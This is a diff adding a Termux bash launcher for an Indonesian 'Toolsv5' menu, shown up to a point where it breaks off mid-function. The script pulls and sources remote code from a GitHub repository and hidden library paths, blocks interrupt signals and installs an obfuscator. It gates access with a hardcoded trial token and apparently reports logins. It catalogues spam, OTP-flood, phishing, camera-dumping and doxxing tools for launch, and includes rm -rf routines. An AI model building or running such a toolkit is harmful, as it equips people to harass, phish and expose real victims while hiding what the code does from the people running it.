@@ -1,0 +1,655 @@
+#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash
+
+set +x
+#!/bin/bash
+echo "DECODE HARAM BEBAN LU ASU" > ROYAL
+scan="/data/data/com.termux/"
+scan1="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu"
+reset-package() {
+     clear
+     rm -rf /data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu
+     rm -rf /data/data/com.termux/files/usr/lib/python3.11/ensurepip/_bundled/Nethercap
+     rm -rf $HOME/Lubeban
+     cd $HOME
+     # Uninstall semua paket
+     pkg uninstall git -y
+     pkg uninstall bash -y
+     pkg uninstall sox -y
+     pkg uninstall python python2 python3 -y
+     pkg uninstall mpv -y
+     pkg uninstall cowsay -y
+     pkg uninstall ruby -y
+     pkg uninstall binutils -y
+     pkg uninstall zip -y
+     pkg uninstall unzip -y
+     pkg uninstall curl -y
+     pkg uninstall jq -y
+     pkg uninstall ossp-uuid -y
+     pkg uninstall ncurses-utils -y
+     pkg uninstall nodejs -y
+     pkg uninstall nodejs-lts -y
+     pkg uninstall python -y
+     pkg uninstall xz-utils -y
+     pkg uninstall busybox -y
+     pip uninstall pyliblzma -y
+     gem uninstall lolcat -x
+     npm -g uninstall bash-obfuscate
+     #installasi package
+     pkg update
+     pkg install git bash -y
+     pkg install neofetch -y
+     pkg install sox mpv -y
+     pkg install python python2 python3 -y
+     pkg install cowsay ruby -y
+     pkg install binutils zip unzip -y
+     pkg install curl jq git ossp-uuid -y
+     pkg install ncurses-utils nodejs -y
+     pkg install nodejs-lts python -y
+     npm -g install bash-obfuscate
+     pkg install xz-utils -y
+     pip install pyliblzma
+     pkg install busybox -y
+     gem install lolcat
+     rm -rf $HOME/Lubeban
+     cd $HOME
+     git clone https://github.com/Lubebansokhekel/Lubeban
+     cd Lubeban
+}
+
+menu() {
+     while true; do
+          choice=$(dialog --clear --stdout --title "Menu Setting Toolsv5" \
+               --menu "Silakan pilih opsi di bawah ini:" 15 50 3 \
+               1 "Masuk Ke Toolsv5" \
+               2 "Pendaftaran ID ( udah buy )" \
+               3 "Cek ID Sebelumnya" \
+               4 "Reset Dan Ulang Installasi Toolsv5" \
+               0 "Keluar")
+
+          # Jika tombol Cancel ditekan (jika $choice kosong), keluar dari script
+          if [ -z "$choice" ]; then
+               clear
+               exit 0
+          fi
+
+          if [ "$choice" = "1" ]; then
+               dialog --infobox "Menjalankan Toolsv5...." 3 40
+               sleep 1
+               if [ -d "$scan1" ]; then
+                    cd "$scan1" || exit 0
+                    git stash &> /dev/null
+                    git pull origin main &> /dev/null
+                    : > /data/data/com.termux/files/usr/tmp/hozokroco
+                    cat << 'EOF' > /data/data/com.termux/files/usr/tmp/hozokroco
+Version="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/Version"
+versitoolsv5=$(cat "$Version")
+update="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/info"
+gal="/data/data/com.termux/files/usr/lib/$versitoolsv5"
+letakgalirus="/data/data/com.termux/files/usr/etc/apt"
+internalsc="/data/data/com.termux/files/usr/include/jso"
+termux_id=$(whoami)
+versitoolsv5=$(cat "$Version")
+edukasi="/data/data/com.termux/files/usr/.galirus-officia"
+echo "ON" > "$edukasi" &> /dev/null
+e="echo -e "
+m="\033[1;31m"   # Merah (Sudah diberikan)
+h="\033[1;32m"   # Hijau (Sudah diberikan)
+k="\033[1;33m"   # Kuning (Sudah diberikan)
+b="\033[1;34m"   # Biru (Sudah diberikan)
+bl="\033[1;36m"  # Biru Muda (Sudah diberikan)
+p="\033[1;37m"   # Putih (Sudah diberikan)
+u="\033[1;35m"   # Ungu
+pu="\033[1;30m"  # Abu-abu
+c="\033[1;96m"   # Cyan Terang
+or="\033[1;91m"  # Merah Muda Terang
+g="\033[1;92m"   # Hijau Terang
+y="\033[1;93m"   # Kuning Terang
+bld="\033[1;94m" # Biru Terang
+pwl="\033[1;95m" # Ungu Terang
+blg="\033[1;97m" # Putih Terang
+lg="\033[1;90m"  # Abu-abu Terang
+bg_m="\033[41m"    # Latar Belakang Merah
+bg_h="\033[42m"    # Latar Belakang Hijau
+bg_k="\033[43m"    # Latar Belakang Kuning
+bg_b="\033[44m"    # Latar Belakang Biru
+bg_bl="\033[46m"   # Latar Belakang Biru Muda
+bg_p="\033[47m"    # Latar Belakang Putih
+bg_u="\033[45m"    # Latar Belakang Ungu
+bg_pu="\033[40m"   # Latar Belakang Abu-abu
+bg_c="\033[106m"   # Latar Belakang Cyan Terang
+bg_or="\033[101m"  # Latar Belakang Merah Muda Terang
+bg_g="\033[102m"   # Latar Belakang Hijau Terang
+bg_y="\033[103m"   # Latar Belakang Kuning Terang
+bg_bld="\033[104m" # Latar Belakang Biru Terang
+bg_pwl="\033[105m" # Latar Belakang Ungu Terang
+bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
+res="\033[0m"
+trial="/data/data/com.termux/files/usr/lib/bash/fndmnc95913592fn"
+trap "echo 'CTRL+C, CTRL+Z, dan CTRL+D diblokir!';" SIGINT SIGTSTP SIGQUIT
+filesound() {
+while true; do
+soundnya="MusicG404"
+filenya="/data/data/com.termux/files/usr/bin/"
+if [ -f "$filenya$soundnya" ]; then
+break
+else
+cp -r $HOME/Lubeban/music.txt $filenya
+mv -f $filenya/music.txt $filenya$soundnya
+fi
+done
+}
+musik="mpv --volume=70 --shuffle --cache=yes --cache-secs=10 --playlist="/data/data/com.termux/files/usr/bin/MusicG404" --title="backsound" &> /dev/null &"
+musikrun() {
+if pgrep -f "mpv.*backsound" > /dev/null; then
+echo "Musik sudah berjalan di latar belakang."
+else
+echo "Musik tidak sedang berjalan, memulai..."
+eval $musik
+fi
+}
+server_main="mpv --volume=60 --shuffle --cache=yes --cache-secs=10 "https://youtu.be/w_VQJBWvJcI"  --title="server" &> /dev/null &"
+maintenance() {
+if pgrep -f "mpv.*server" > /dev/null; then
+echo "Musik sudah berjalan di latar belakang."
+else
+echo "Musik tidak sedang berjalan, memulai..."
+eval $server_main
+fi
+}
+source /data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/.Lihat-Ada-Anak-Anjing
+sound_efek_murid_galirus() {
+karakter=("KAYOKO" "SEIA" "REISA" "ATSUKO" "NERU" "HOSHINO_PRIME" "SHIROKO_TERROR" "IBUKI" "ARISU" "MAMAHINA" "NONOMI" "IZUNA" "MOMOI" "SERIKA" "SHIROKO" "HOSHINO" "SAORI" "MITSUKI" "MIKA" "KASUZA" "HINADRES" "HINA" "HARUKA" "HANAKO")
+random_index=$((RANDOM % ${#karakter[@]}))
+putar="${karakter[random_index]}"
+acak_audio=$(echo "${audio_urls[$putar]}" | tr ' ' '\n')
+for audio in $acak_audio; do
+clear
+echo "$putar" > /sdcard/.voice
+mpv --volume=50 --cache=yes --cache-secs=10 "$audio" --title="murid_kesayangan_galirus" &> /dev/null
+done
+}
+play_sound_effect() {
+while true; do
+audio_cek=$(cat /sdcard/.voice)
+if ps aux | grep -v grep | grep -q "mpv.*murid_kesayangan_galirus"; then
+echo "$audio_cek"
+echo "Sound On ( voice sedang berjalan )"
+sleep 3
+break
+else
+echo "Sound Off ( loading play ) "
+sound_efek_murid_galirus &> /dev/null &
+sleep 3
+fi
+done
+}
+list=(
+"$HOME/litespam"
+"/data/data/com.termux/files/usr/share/gemoxi"
+"$HOME/Ketupat-Terror"
+"$HOME/Premium-Call"
+"$HOME/OTP_TeRoRV2"
+"/data/data/com.termux/files/usr/lib/bash/spam/"
+"/data/data/com.termux/files/usr/lib/pkgconfig/spamweb"
+"$HOME/seeker"
+"/data/data/com.termux/files/usr/opt/zphisher"
+"$HOME/ngrok"
+"$HOME/adbwebkit"
+"/sdcard/UserFinder"
+"/sdcard/CAM-DUMPER"
+"$HOME/Temp-Mail"
+"$HOME/Doxxer-Toolkit"
+"$HOME/okadminfinder3"
+"$pandora"
+"/data/data/com.termux/files/usr/include/NIK"
+"$HOME/overload"
+"$HOME/GhostTrack"
+"$HOME/okadminfinder3"
+"$HOME/RED_HAWK"
+"/data/data/com.termux/files/usr/bot2g404"
+"/data/data/com.termux/files/usr/bot3"
+"/data/data/com.termux/files/usr/Bot4"
+"$bot3"
+)
+echo "DECODE HARAM BEBAN LU ASU" > /data/data/com.termux/files/home/Lubeban/run
+echo "echo "Ketik Toolsv5 Aja ! "" > /data/data/com.termux/files/home/Lubeban/run.sh
+echo "echo "DECODE HARAM BEBAN LU ASU"" > /data/data/com.termux/files/usr/tmp/hozokroco
+echo "echo "DECODE HARAM BEBAN LU ASU"" > /data/data/com.termux/files/usr/lib/python3.11/ensurepip/_bundled/Nethercap/ROYAL
+banner1() {
+echo "⠀
+⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
+⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
+⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
+⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
+⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
+⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
+⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
+⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
+⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
+⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
+⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
+⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
+⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿ "
+}
+banner2() {
+echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
+⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
+⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
+⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
+⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
+⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
+⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
+⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
+⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
+⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
+⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
+⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
+⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
+⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈"
+}
+banner4() {
+echo "
+⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⢀⣾⡿⠋⠉⠁⢠⣿⠏⢁⣿⣿⣿⠏⠉⢸⣿⡏⠉⢻⣿⣿⡇⠈⠙⢿⣿⣿⣿⣷⡆⠀⠀⢇⠢⣈⡒⡤
+⣿⣿⣿⣿⣿⣏⣴⡇⠀⠀⠀⢠⡿⠋⠀⠀⠀⣰⣿⠋⠀⣼⣿⣿⠏⠀⠀⡾⣿⠁⠀⠀⣿⣿⣷⠀⠀⠀⠹⣿⣿⣿⣿⣄⢀⣿⣷⣿⣶⣶
+⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⢠⡟⠁⠀⠀⠀⢰⣿⠇⠀⢰⣿⣿⡷⠀⣀⣜⣁⣻⣀⣀⣀⣸⢻⣿⡇⠀⠀⠀⠘⣿⣿⣷⠹⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠃⠀⠀⣠⣿⠀⠀⠀⠀⢠⣿⡏⠀⢀⣿⣿⡿⠛⣩⣿⠿⠛⢻⡏⠉⠉⢹⠉⢿⣿⡀⠀⠀⠀⠹⣿⣿⡆⠙⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⡏⠀⠀⣰⣿⡟⠀⠀⠀⢀⣾⣿⠀⠀⣸⣿⡿⢥⣶⠝⠁⠀⠀⠀⡇⠀⠀⡜⠰⡀⢻⡇⠀⠀⠀⠀⢿⣿⣿⠀⠸⣿⣿⣿⡿
+⣿⣿⢿⣿⣿⡃⠀⣼⣿⣿⡇⣀⣀⣤⣾⣿⡇⠀⠰⣼⡟⣠⠎⠁⠀⢀⣠⠔⠁⢹⣀⣠⣧⣶⣦⣤⣷⣤⣤⣠⣤⠼⣿⣿⡆⠀⢹⣿⣿⣿
+⣿⣿⣿⣿⣿⠀⣼⣿⣿⣿⣏⣁⣼⣿⣿⣿⠀⢠⣾⣟⡔⠁⠀⠀⠀⢸⠁⠀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣿⣿⣇⠀⠀⣿⣿⣿
+⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⣟⣹⣿⣿⣿⡿⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⢰⣾⢟⣻⡿⠛⢻⢋⣻⣏⣱⠞⠙⣄⡀⠀⣿⡽⣿⠀⠀⢸⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠉⢘⡅⠚⠋⠉⠁⠀⠀⠀⠀⣔⣾⢏⢦⢄⣿⣧⣿⡆⠀⠈⣿⣿
+⣿⣿⣿⣿⣿⡿⢸⣿⣿⣿⡿⢻⣿⣿⡿⠋⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠟⠉⠀⢂⢻⣿⣿⣿⡇⠀⠀⢽⣿
+⣿⣿⣿⣿⣿⢃⣿⣿⣿⣿⣷⣿⣿⣿⣿⡷⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⢀⣠⣾⣟⡖⢻⣿⣿⠃⠀⠀⣿⣿
+⣿⣿⣿⣿⣟⣼⣿⣿⣿⣿⣿⣿⠟⣻⠿⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠾⠿⠛⠉⠁⢰⢸⣿⡿⠀⠀⠀⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠋⠰⢟⣿⠌⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠇⠀⠀⢠⡇⣿
+⣿⣿⣿⣿⣿⣿⣏⠓⠓⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠿⢾⣿⡟⠀⠀⠀⣼⠃⣿
+⣿⣿⣿⣿⣿⣿⣿⣷⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠤⠤⠤⠤⠤⠄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⣰⠏⢰⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⡀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣠⢚⣡⣴⣾⣿⣿⣿⣿⡿⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠁⠀⠀⣰⠏⣠⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣧⣤⣴⡾⠋⠀⠀⠀⠀⠀⠀⠀⣃⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⣼⣿⣃⠤⠚⠚⠉⠉⠉⠙⠛
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠉⠀⢀⡄⠀⠀⠀⠀⠀⠀⠙⢽⣿⠿⠋⠉⠁⠀⢠⡆⢰⠃⠀⠀⠀⠀⠀⠀⣼⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣴⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⢯⠀⠀⠀⠀⢀⡞⢠⠋⠀⠀⠀⠀⠀⢀⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⣸⢠⠃⠀⠀⠀⠀⠀⢠⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⡆⢠⠉⢿⣿⣿⡟⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠀⠀⡇⠇⠀⠀⠀⠀⠀⣠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣼⠀⠈⢿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⡗⠤⣀⠀⠀⠀⠀⠀⠑⢄⣀⡞⠀⠀⠀⠀⢀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣷⠀⠀⠹⢇⠀⢻⣿⣿⣿⣿⣿⣿⣧⠀⠈⠻⣷⣦⣤⣀⡀⠀⠉⠀⠀⠀⣀⡴⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⠟⠀⠀⠀⠈⠳⣄⢻⣿⣿⣿⣿⣿⣿⣆⠀⠀⠈⠻⢿⣿⣿⣿⣷⣶⣴⣾⣿⣿⣿⣿⡿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⣿⣿⣄⠀⠀⠀⠀⠀⠈⠳⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠉⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢱⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+}
+logo=("banner1" "banner2" "banner4")
+random_index=$((RANDOM % ${#logo[@]}))
+banner="${logo[random_index]}"
+kunci_trial() {
+trap "echo 'CTRL+C, CTRL+Z, dan CTRL+D diblokir!';" SIGINT SIGTSTP SIGQUIT
+regis() {
+while true; do
+clear
+banner2 | lolcat
+$e $b
+xdg-open "https://sfl.gl/jr8gp"
+$e $h $bg_lg"Link Token$m :$c https://sfl.gl/jr8gp$res$b "
+read -p "Masukkan Token: " USER_API_KEY
+play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
+if [ "$USER_API_KEY" == "$API_KEY" ]; then
+clear
+$e $h $bg_lg"Token valid$k.$bl Selamat datang$k!$res"
+echo $(date +%s) > "$LOGIN_FILE"
+isipesan="Terdetek login Mode Trial Apikey : $USER_API_KEY ��‍💻"
+TRIAL_USER &> /dev/null
+sleep 3
+break
+else
+clear
+play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
+$e $m $bg_lg"Token tidak valid$k!$res"
+sleep 3
+xdg-open "https://sfl.gl/jr8gp"
+fi
+done
+}
+while true; do
+LOGIN_FILE="/data/data/com.termux/files/usr/etc/.resolv.confg"
+API_KEY="123456"
+if [ -f "$LOGIN_FILE" ]; then
+LAST_LOGIN=$(cat "$LOGIN_FILE")
+CURRENT_TIME=$(date +%s)
+TIME_DIFF=$((CURRENT_TIME - LAST_LOGIN))
+if [ $TIME_DIFF -ge 3600 ]; then
+clear
+play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
+$e $m $bg_lg"1 jam$c telah berlalu\nmohon login kembali dengan Token$res"
+isipesan="System Kadaluarsa Bekerja 👨‍��"
+TRIAL_USER &> /dev/null
+sleep 5
+rm "$LOGIN_FILE"
+else
+clear
+play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
+$e $b $bg_lg"Selamat datang kembali!\nAnda masih dalam periode$h login$b yang$h valid.$res"
+isipesan="System Perpanjang Berlaku 👨‍��"
+TRIAL_USER &> /dev/null
+sleep 3
+break
+fi
+else
+regis
+fi
+done
+}
+cachetoolsv5() {
+LIST_FILE="$HOME/.list.txt"
+function clear_terminal() {
+clear
+}
+function banner() {
+$e "\033[1;32m
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⠀⢀⣴⣿⣿⣿⣷⡄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⡿⠋⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣬⣭⣥⣤⣤⣄⣀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣄⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄
+⠀⠀⠀⣠⠞⢛⣷⡾⠟⠁⠀⠀⠀⠀⠀⢀⣾⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿
+⠀⢠⡟⢁⣴⣿⣯⠀⢀⣤⣤⣤⣤⣤⣤⣿⣿⡟⠁⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
+⠀⣠⣿⠟⢋⣭⠙⣡⣈⠻⠿⠿⠿⠿⠿⠟⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
+⠸⠟⠁⣀⣈⢋⣀⣘⣉⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
+⠀⢸⣿⡿⣿⣿⢿⣿⢿⣿⡿⢿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿
+⠀⠸⣿⡇⣿⣿⢸⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⡇⠸⣿⣿
+⠀⠀⣿⡇⢻⣿⢸⣿⢸⣿⠇⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
+⠀⠀⣿⣧⢸⣿⢸⣿⢸⣿⠀⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⡗⠀⣿⣿⣿⡇⠀⠀⠀
+⠀⠀⢸⣿⢸⣿⢸⣿⢸⣿⢸⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣏⠀⣿⣿⣿⡇⠀⠀⠀
+⠀⠀⢸⣿⠈⣿⢸⣿⢸⡟⢸⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡧⠀⣿⣿⣿⡇⠀⠀⠀
+⠀⠀⠈⣿⣿⣿⣾⣿⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠏⠀⢻⣿⣿⠇⠀
+\033[1;37mHOZOO X TONY
+\n"
+}
+function get_size() {
+du -sh "$1" 2> /dev/null | cut -f1
+}
+function clear_folder() {
+$e "\n\033[1;93mSedang Proses Menghapus"
+total_size_before=0
+for path in "$@"; do
+if [ -d "$path" ]; then
+size=$(get_size "$path")
+$e "\033[1;93mUkuran Di Hapus\033[1;37m: $size"
+rm -rf "$path"
+fi
+done
+$e "\033[1;93mBerhasil Menghapus"
+sleep 2
+}
+function cek_list() {
+clear_terminal
+banner
+if [ -f "$LIST_FILE" ]; then
+$e "\033[1;93mDaftar Isi List:\n"
+cat -n "$LIST_FILE"
+else
+$e "\n\033[1;93mDaftar List Kosong."
+fi
+read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
+}
+function add_to_list() {
+clear_terminal
+banner
+$e "\033[1;93mMasukan Direktori Untuk Di Tambahkan Ke List:"
+$e "\033[1;93mContoh\033[1;37m: \033[1;36m/sdcard/download"
+while true; do
+read -p $'\n\033[1;93mMasukan\033[1;37m:-»\033[1;36m ' folder_path
+echo "$folder_path" >> "$LIST_FILE"
+$e "\n\033[1;93mDirektori Di Tambahkan"
+read -p $'\033[1;37mMau Menambahkan Lagi (y/n): ' choice
+if [ "$choice" != "y" ]; then
+break
+fi
+done
+}
+function delete_from_list() {
+while true; do
+clear_terminal
+banner
+if [ -f "$LIST_FILE" ]; then
+$e "\033[1;93mDaftar Isi List:\n"
+cat -n "$LIST_FILE"
+read -p $'\n\033[1;93mPilih Nomor Yang Mau Di Hapus\033[1;31m:\033[1;37m ' choice
+if [[ "$choice" =~ ^[0-9]+$ ]]; then
+sed -i "${choice}d" "$LIST_FILE"
+$e "\n\033[1;93mDirektori Dihapus"
+else
+$e "\n\033[1;93mMasukkan Dengan Benar"
+fi
+read -p $'\n\033[1;37mMau Menghapus Lagi (y/n):\033[1;37m ' continue_choice
+if [ "$continue_choice" != "y" ]; then
+break
+fi
+else
+$e "\n\033[1;93mDaftar List Kosong."
+read -p $'\n\033[1;37mTekan Enter Untuk Kembali' enter
+break
+fi
+done
+}
+function main_menu() {
+while true; do
+clear_terminal
+banner
+$e "\033[1;93mDaftar Menu\033[1;37m:"
+$e "\033[1;93m1\033[1;31m. \033[1;36mClear"
+$e "\033[1;93m2\033[1;31m. \033[1;36mCek List"
+$e "\033[1;93m3\033[1;31m. \033[1;36mTambahkan List"
+$e "\033[1;93m4\033[1;31m. \033[1;36mHapus List"
+$e "\033[1;93m5\033[1;31m. \033[1;36mExit"
+read -p $'\033[1;93mSilahkan Pilih \033[31m(\033[1;37m1-5\033[31m)\033[1;37m: ' choice
+case $choice in
+1)
+if [ -f "$LIST_FILE" ]; then
+mapfile -t folder_paths < "$LIST_FILE"
